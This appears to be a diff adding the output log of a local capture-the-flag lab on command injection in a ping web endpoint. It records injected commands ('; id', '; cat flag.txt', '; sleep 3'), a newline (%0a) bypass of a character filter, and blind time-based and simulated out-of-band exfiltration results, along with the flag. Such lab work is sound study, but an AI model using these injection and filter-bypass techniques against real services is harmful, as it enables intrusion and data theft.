@@ -1,0 +1,64 @@
+############################################################
+# 0. Ping binh thuong
+############################################################
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.038 ms
+
+############################################################
+# 1. IN-BAND: host=127.0.0.1; id  (noi lenh bang ;)
+############################################################
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
+uid=1000(haipanda) gid=1000(Administrator) groups=1000(Administrator),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
+
+############################################################
+# 2. IN-BAND: doc flag.txt bang ; cat flag.txt
+############################################################
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.040/0.040/0.040/0.000 ms
+WEB{c0mm4nd_1nj3ct10n_rce_qua_ping}
+
+############################################################
+# 3. /ping2 LOC ; & | $ ` -> bi chan
+############################################################
+Tu choi: ky tu khong hop le
+
+############################################################
+# 4. /ping2 BYPASS bang xuong dong (%0a) ma filter quen chan
+############################################################
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=3.66 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 3.664/3.664/3.664/0.000 ms
+uid=1000(haipanda) gid=1000(Administrator) groups=1000(Administrator),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
+---- doc flag qua %0a ----
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.042 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.042/0.042/0.042/0.000 ms
+WEB{c0mm4nd_1nj3ct10n_rce_qua_ping}
+
+############################################################
+# 5. /ping3 BLIND - time-based: ; sleep 3 (do thoi gian phan hoi)
+############################################################
+  host=127.0.0.1 (khong sleep): 0.007289s
+  host=127.0.0.1; sleep 3     : 3.008631s
+
+############################################################
+# 6. /ping3 BLIND - OOB: ghi output ra file roi doc (mo phong exfil)
+############################################################
+  noi dung file OOB (/tmp/oob_2_5.txt):
+    uid=1000(haipanda) gid=1000(Administrator) groups=1000(Administrator),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
+    WEB{c0mm4nd_1nj3ct10n_rce_qua_ping}
